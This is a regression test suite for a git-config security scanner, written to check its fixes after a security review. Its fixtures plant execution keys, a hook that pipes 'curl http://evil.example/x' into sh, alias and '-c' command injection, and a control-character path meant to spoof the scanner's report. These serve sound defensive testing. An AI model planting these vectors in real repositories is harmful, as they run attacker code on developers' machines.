// Regression suite for independent security review 01 (v0.3.0, commit 413be99).
//
// Every test here fails on 413be99 and encodes one confirmed defect. They stay in
// the suite permanently. Where a case cannot run on the current platform the test
// skips itself visibly - it never passes by doing nothing.

import { test } from 'node:test';
import assert from 'node:assert/strict';
import path from 'node:path';
import { mkdir, writeFile, readFile, rm, symlink, chmod } from 'node:fs/promises';
import { execFile } from 'node:child_process';
import { fileURLToPath } from 'node:url';
import { loadRules, scan } from '../src/scanners/gitconfig.js';
import { formatText, formatMarkdown } from '../src/report/formatter.js';

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const ROOT = path.join(__dirname, '..');
const RULES = path.join(ROOT, 'rules', 'git-exec-keys.json');
const CLI = path.join(ROOT, 'bin', 'guardskill.js');
const WORK = path.join(__dirname, 'fixtures', '.review01');

async function write(file, content) {
  await mkdir(path.dirname(file), { recursive: true });
  await writeFile(file, content);
}
async function repo(name, config, extra = {}) {
  const dir = path.join(WORK, name);
  await rm(dir, { recursive: true, force: true });
  await write(path.join(dir, '.git', 'config'), config);
  for (const [rel, content] of Object.entries(extra)) await write(path.join(dir, rel), content);
  return dir;
}
function cli(args, opts = {}) {
  return new Promise(resolve => {
    execFile(process.execPath, [CLI, ...args], { maxBuffer: 64 * 1024 * 1024, ...opts },
      (err, stdout, stderr) => resolve({ code: err ? (err.code ?? 1) : 0, stdout, stderr }));
  });
}
const ids = r => r.findings.map(f => f.ruleId);
const worst = r => ['critical', 'high', 'medium', 'low'].find(s => r.findings.some(f => f.severity === s)) ?? 'none';

// ---------------------------------------------------------------- F-01
test('F-01 an included config file is inspected, not just reported', async () => {
  const rules = await loadRules(RULES);
  const dir = await repo('include-payload',
    '[include]\n\tpath = ../notes/build-flags.txt\n',
    { 'notes/build-flags.txt': '[core]\n\tfsmonitor = /tmp/payload.sh\n' });
  const r = await scan(dir, rules);
  assert.ok(ids(r).includes('core-fsmonitor'),
    `git applies this value (git config core.fsmonitor returns it) but it was not reported: ${JSON.stringify(ids(r))}`);
  const { code } = await cli([dir, '--no-color']);
  assert.equal(code, 1, 'the default --fail-on high must fail on an include-delivered execution key');
});

test('F-01b an include pointing outside the tree is high, not medium', async () => {
  const rules = await loadRules(RULES);
  const dir = await repo('include-outside', '[include]\n\tpath = /etc/gitconfig-somewhere\n');
  const r = await scan(dir, rules);
  assert.equal(worst(r), 'high', 'an unverifiable include must not be reported below the default threshold');
});

// ---------------------------------------------------------------- F-02
test('F-02 "git" is not a safe command prefix', async () => {
  const rules = await loadRules(RULES);
  for (const [key, section] of [['clean', 'filter "x"'], ['smudge', 'filter "x"'], ['process', 'filter "x"'],
                                ['textconv', 'diff "x"'], ['driver', 'merge "x"']]) {
    const dir = await repo(`git-prefix-${key}`, `[${section}]\n\t${key} = git -c alias.zz=!/tmp/payload.sh zz\n`);
    const r = await scan(dir, rules);
    assert.ok(r.findings.some(f => ['high', 'critical'].includes(f.severity)),
      `${key}: a git invocation carrying -c executes an arbitrary command and must be flagged`);
  }
});

test('F-02b the real git-lfs filter values stay silent', async () => {
  const rules = await loadRules(RULES);
  const dir = await repo('git-lfs-real',
    '[filter "lfs"]\n\tclean = git-lfs clean -- %f\n\tsmudge = git-lfs smudge -- %f\n\tprocess = git-lfs filter-process\n\trequired = true\n');
  assert.equal((await scan(dir, rules)).findings.length, 0);
});

// ---------------------------------------------------------------- F-03
test('F-03 execution keys outside core.* are covered', async () => {
  const rules = await loadRules(RULES);
  const cases = {
    'pager-subcommand':   '[pager]\n\tlog = /tmp/payload.sh\n',
    'gpg-program':        '[gpg]\n\tprogram = /tmp/payload.sh\n',
    'remote-uploadpack':  '[remote "origin"]\n\turl = ../other\n\tuploadPack = /tmp/payload.sh\n',
    'remote-receivepack': '[remote "origin"]\n\turl = ../other\n\treceivePack = /tmp/payload.sh\n',
    'core-askpass':       '[core]\n\taskPass = /tmp/payload.sh\n',
    'alternate-refs':     '[core]\n\talternateRefsCommand = /tmp/payload.sh\n',
    'trailer-command':    '[trailer "sign"]\n\tcommand = /tmp/payload.sh\n',
  };
  const missed = [];
  for (const [name, config] of Object.entries(cases)) {
    const r = await scan(await repo(name, config), rules);
    if (!r.findings.some(f => ['high', 'critical'].includes(f.severity))) missed.push(name);
  }
  assert.deepEqual(missed, [], `keys git executes that produced no high/critical finding: ${missed.join(', ')}`);
});

// ---------------------------------------------------------------- F-04
test('F-04 an alias that reconfigures git is flagged even without a leading bang', async () => {
  const rules = await loadRules(RULES);
  const dir = await repo('alias-dash-c', '[alias]\n\tst = -c core.pager=/tmp/payload.sh log\n');
  const r = await scan(dir, rules);
  assert.ok(r.findings.some(f => ['high', 'critical'].includes(f.severity)), JSON.stringify(ids(r)));
  const clean = await repo('alias-plain', '[alias]\n\tlg = log --oneline --graph\n');
  assert.equal((await scan(clean, rules)).findings.length, 0, 'an ordinary alias must stay silent');
});

// ---------------------------------------------------------------- F-05
test('F-05 a hook script that is a symlink is still inspected', async t => {
  const rules = await loadRules(RULES);
  const dir = await repo('symlink-hook', '[core]\n\trepositoryformatversion = 0\n');
  await write(path.join(dir, 'payload.sh'), '#!/bin/sh\ncurl http://evil.example/x | sh\n');
  await chmod(path.join(dir, 'payload.sh'), 0o755);
  await mkdir(path.join(dir, '.git', 'hooks'), { recursive: true });
  try {
    await symlink(path.join(dir, 'payload.sh'), path.join(dir, '.git', 'hooks', 'pre-commit'));
  } catch (err) {
    return t.skip(`platform cannot create a symlink (${err.code}) - this guarantee is UNTESTED here`);
  }
  const r = await scan(dir, rules);
  assert.ok(r.findings.length > 0, 'git executes a symlinked hook; the scan reported nothing');
});

// ---------------------------------------------------------------- F-06
test('F-06 a git directory whose name differs only in case is found', async () => {
  const rules = await loadRules(RULES);
  const dir = await repo('uppercase-git', '[core]\n\trepositoryformatversion = 0\n',
    { 'vendor/pkg/.GIT/config': '[core]\n\tfsmonitor = /tmp/payload.sh\n' });
  const r = await scan(dir, rules);
  assert.ok(ids(r).includes('core-fsmonitor'),
    'on Windows and macOS git resolves .GIT/config; the scan must not depend on the case of the name');
});

// ---------------------------------------------------------------- F-07
test('F-07a the CLI default depth matches the documented default and the library', async () => {
  const dir = await repo('deep-bare', '[core]\n\trepositoryformatversion = 0\n');
  let p = dir;
  for (let i = 0; i < 10; i++) p = path.join(p, `level${i}`);
  await write(path.join(p, 'hidden.git', 'config'), '[core]\n\tfsmonitor = /tmp/payload.sh\n');
  await write(path.join(p, 'hidden.git', 'HEAD'), 'ref: refs/heads/main\n');
  await mkdir(path.join(p, 'hidden.git', 'objects'), { recursive: true });
  const { code, stdout } = await cli([dir, '--no-color']);
  assert.notEqual(code, 0, `a bare repo with core.fsmonitor at depth 11 was not reached:\n${stdout}`);
});

test('F-07b an incomplete walk never exits 0', async () => {
  const dir = await repo('truncated', '[core]\n\trepositoryformatversion = 0\n');
  let p = dir;
  for (let i = 0; i < 6; i++) p = path.join(p, `l${i}`);
  await mkdir(p, { recursive: true });
  const { code, stdout } = await cli([dir, '--max-depth', '2', '--no-color']);
  assert.notEqual(code, 0, `an incomplete scan reported success:\n${stdout}`);
});

test('F-07c a path that does not exist is an error, not a clean result', async () => {
  const { code } = await cli([path.join(WORK, 'no-such-directory'), '--no-color']);
  assert.equal(code, 2, 'a missing target must exit 2 (ERROR), not 0');
});

// ---------------------------------------------------------------- F-08
test('F-08 --json survives a pipe', async () => {
  const lines = ['[core]'];
  for (let i = 0; i < 400; i++) lines.push(`\tsshCommand = /tmp/p${i}.sh`);
  const dir = await repo('big-report', lines.join('\n') + '\n');
  // execFile pipes stdout, which is exactly the failing condition.
  const { stdout } = await cli([dir, '--json']);
  assert.doesNotThrow(() => JSON.parse(stdout),
    `stdout was truncated at ${stdout.length} bytes; process.exit() dropped the buffered write`);
});

// ---------------------------------------------------------------- F-09
test('F-09 a config reached through a symlink is refused, not read', async t => {
  const rules = await loadRules(RULES);
  const outside = path.join(WORK, 'outside', 'private.gitconfig');
  await write(outside, '[core]\n\tfsmonitor = /secret/marker-value-do-not-print\n');
  const dir = path.join(WORK, 'symlink-config');
  await rm(dir, { recursive: true, force: true });
  await mkdir(path.join(dir, '.git'), { recursive: true });
  try {
    await symlink(outside, path.join(dir, '.git', 'config'));
  } catch (err) {
    return t.skip(`platform cannot create a symlink (${err.code}) - this guarantee is UNTESTED here`);
  }
  const r = await scan(dir, rules);
  const printed = formatText(r, { color: false }) + formatMarkdown(r) + JSON.stringify(r);
  assert.ok(!printed.includes('marker-value-do-not-print'),
    'content of a file outside the scanned tree ended up in the report');
  assert.ok(r.findings.some(f => f.severity === 'high'),
    'a refused symlinked config must be reported, not silently skipped');
});

// ---------------------------------------------------------------- F-10
test('F-10a a clean structural finding is not critical on its own', async () => {
  const rules = await loadRules(RULES);
  const dir = await repo('clean-bare-fixture', '[core]\n\trepositoryformatversion = 0\n', {
    'testdata/history.git/config': '[core]\n\trepositoryformatversion = 0\n\tbare = false\n',
    'testdata/history.git/HEAD': 'ref: refs/heads/main\n',
    'testdata/history.git/objects/.keep': '',
  });
  const r = await scan(dir, rules);
  assert.ok(r.findings.length > 0, 'a git directory shipped as content should still be reported');
  assert.notEqual(worst(r), 'critical',
    'a bare repository whose config holds no execution key is unusual, not critical - real projects (git-lfs) ship these as fixtures');
});

test('F-10b ordinary filter and textconv commands are not high', async () => {
  const rules = await loadRules(RULES);
  const dir = await repo('real-world-filters',
    '[filter "nop"]\n\tclean = cat\n\tsmudge = cat\n' +
    '[filter "sops"]\n\tclean = sops --encrypt /dev/stdin\n\tsmudge = sops --decrypt /dev/stdin\n' +
    '[filter "strip"]\n\tclean = jupyter nbconvert --clear-output --stdin --stdout\n' +
    '[diff "ipynb"]\n\ttextconv = jupyter nbconvert --to script --stdout\n');
  const r = await scan(dir, rules);
  assert.ok(!r.findings.some(f => ['high', 'critical'].includes(f.severity)),
    `legitimate PATH-resolved filters must not fail the documented CI recipe: ${JSON.stringify(r.findings.map(f => [f.severity, f.evidence]))}`);
});

test('F-10c a submodule registered by a nested .gitmodules is recognised', async () => {
  const rules = await loadRules(RULES);
  const dir = await repo('nested-gitmodules', '[core]\n\trepositoryformatversion = 0\n', {
    'sub/.git/config': '[core]\n\trepositoryformatversion = 0\n',
    'sub/.gitmodules': '[submodule "vendor/lib"]\n\tpath = vendor/lib\n\turl = https://example.com/lib.git\n',
    'sub/vendor/lib/.git/config': '[core]\n\trepositoryformatversion = 0\n',
  });
  const r = await scan(dir, rules);
  assert.ok(!r.findings.some(f => f.location.startsWith('sub/vendor/lib')),
    'a submodule registered in the subproject that owns it must not be reported as an unregistered nested repo');
});

test('F-10d arguments to an allowlisted credential helper are inspected', async () => {
  const rules = await loadRules(RULES);
  const dir = await repo('helper-args', '[credential]\n\thelper = store --file=/tmp/git-credentials\n');
  const r = await scan(dir, rules);
  assert.ok(r.findings.some(f => ['high', 'critical'].includes(f.severity)),
    'redirecting plaintext credential storage into /tmp must not pass because the first word is allowlisted');
});

// ---------------------------------------------------------------- F-11
test('F-11 a hostile directory name cannot rewrite the report', async t => {
  const rules = await loadRules(RULES);
  const evil = 'vendor[2K\rNo findings. Nothing was changed';
  const dir = await repo('hostile-path', '[core]\n\trepositoryformatversion = 0\n');
  try {
    await write(path.join(dir, evil, '.git', 'config'), '[core]\n\trepositoryformatversion = 0\n');
  } catch (err) {
    return t.skip(`platform rejects control characters in a file name (${err.code})`);
  }
  const r = await scan(dir, rules);
  for (const [name, text] of [['text', formatText(r, { color: false })], ['markdown', formatMarkdown(r)]]) {
    assert.ok(!/[\r]/.test(text), `${name} output carries raw control characters from a directory name`);
  }
});

// ---------------------------------------------------------------- F-12
test('F-12 an invalid ruleset is rejected with a clear error', async () => {
  const bad = path.join(WORK, 'rules');
  const base = JSON.parse(await readFile(RULES, 'utf-8'));

  const withSeverity = {
    ...base,
    rules: [...base.rules, {
      id: 'x', severity: 'info', matchType: 'always-flag',
      match: { section: 'core', key: 'bare' }, title: 't', explanation: 'e', remediation: 'r',
    }],
  };
  await write(path.join(bad, 'severity.json'), JSON.stringify(withSeverity));
  await assert.rejects(() => loadRules(path.join(bad, 'severity.json')), /severity/i,
    'a severity outside critical/high/medium/low must be rejected at load time, not silently pin the exit code to 1');

  const withRegex = { ...base, remoteExecIndicators: [...base.remoteExecIndicators, '([unclosed'] };
  await write(path.join(bad, 'regex.json'), JSON.stringify(withRegex));
  await assert.rejects(() => loadRules(path.join(bad, 'regex.json')), /pattern|regex/i,
    'an uncompilable pattern must be rejected at load time');
});

// ---------------------------------------------------------------- F-13
test('F-13 package metadata carries no placeholders', async () => {
  const pkg = await readFile(path.join(ROOT, 'package.json'), 'utf-8');
  assert.ok(!/REPLACE_|<your|TODO/i.test(pkg), 'package.json still contains a placeholder owner');
});
